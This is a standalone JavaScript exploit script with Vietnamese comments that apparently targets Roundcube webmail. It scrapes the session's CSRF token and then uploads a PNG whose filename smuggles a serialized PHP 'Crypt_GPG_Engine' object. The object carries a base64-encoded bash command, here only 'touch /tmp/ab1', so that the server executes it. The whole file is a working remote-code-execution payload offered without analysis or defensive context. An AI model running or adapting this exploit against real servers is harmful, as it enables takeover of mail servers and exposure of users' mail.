(async () => {
  const baseUrl = location.origin;

  const pngBase64 =
    'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxl' +
    'WElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdp' +
    'AAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAICgAwAEAAAA' +
    'AQAAAFwAAAAAbqF/KQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAWBJREFUeAHt1MEJACEA' +
    'xMDzSvEn2H97CrYx2Q4Swo659vkaa+BnyQN/BgoAD6EACgA3gOP3AAWAG8Dxe4ACwA3g' +
    '+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuA' +
    'CsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAb' +
    'wPF7gALADeD4PUAB4AZw/B6gAHADOH4PUAC4ARy/BygA3ACO3wMUAG4Ax+8BCgA3gOP3' +
    'AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoA' +
    'N4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HgAP4AJekAIumg+xBAAAAABJRU5ErkJggg==';

  // 1. Lấy CSRF token
  const mailResp = await fetch(`${baseUrl}/?_task=mail`, { credentials: 'include' });
  const mailText = await mailResp.text();
  const m = /"request_token":"([^"]+)"/.exec(mailText);
  if (!m) {
    console.error('Không tìm thấy CSRF token');
    return;
  }
  const csrf = m[1];
  console.log('[+] CSRF:', csrf);

  // 2. Tạo multipart body thủ công
  const boundary = '----WebKitFormBoundary' + Math.random().toString(36).slice(2);

  const malFilename =
    'payload.php;|O:16:\\"Crypt_GPG_Engine\\":1:{s:8:\\"_gpgconf\\";s:52:\\"bash -c \' $(base64 -d <<< \\"dG91Y2ggL3RtcC9hYjE=\\")\';#\\";};';

  const rawFilename = 'payload.php;|O:16:"Crypt_GPG_Engine":1:{s:8:"_gpgconf";s:52:"bash -c \' $(base64 -d <<< "dG91Y2ggL3RtcC9hYjE=")\';#";};';
  const safeFilename = rawFilename.replace(/"/g, '\\"');  // Escape tất cả dấu "

  const preamble =
  `--${boundary}\r\n` +
  `Content-Disposition: form-data; name="_file[]"; filename="${safeFilename}"\r\n` +
  `Content-Type: image/png\r\n\r\n`;

  const fileUint8 = Uint8Array.from(atob(pngBase64), c => c.charCodeAt(0));
  const ending = `\r\n--${boundary}--\r\n`;

  const enc = new TextEncoder();
  const body = new Uint8Array(
    enc.encode(preamble).length + fileUint8.length + enc.encode(ending).length
  );
  body.set(enc.encode(preamble), 0);
  body.set(fileUint8, enc.encode(preamble).length);
  body.set(enc.encode(ending), enc.encode(preamble).length + fileUint8.length);

  // 3. Gửi request upload
  const ts = Date.now();
  const upUrl =
    `${baseUrl}/?_task=settings&_framed=1&_remote=1` +
    `&_from=edit-!xxx&_id=&_uploadid=upload${ts}` +
    `&_unlock=loading${ts + 1}&_action=upload&_token=${csrf}`;

  const resp = await fetch(upUrl, {
    method: 'POST',
    body,
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'X-Requested-With': 'XMLHttpRequest',
      'Accept': 'application/json, text/javascript, */*; q=0.01'
    },
    credentials: 'include'
  });

  const text = await resp.text();
  console.log('[*] Upload response:\n', text.slice(0, 800));
})();
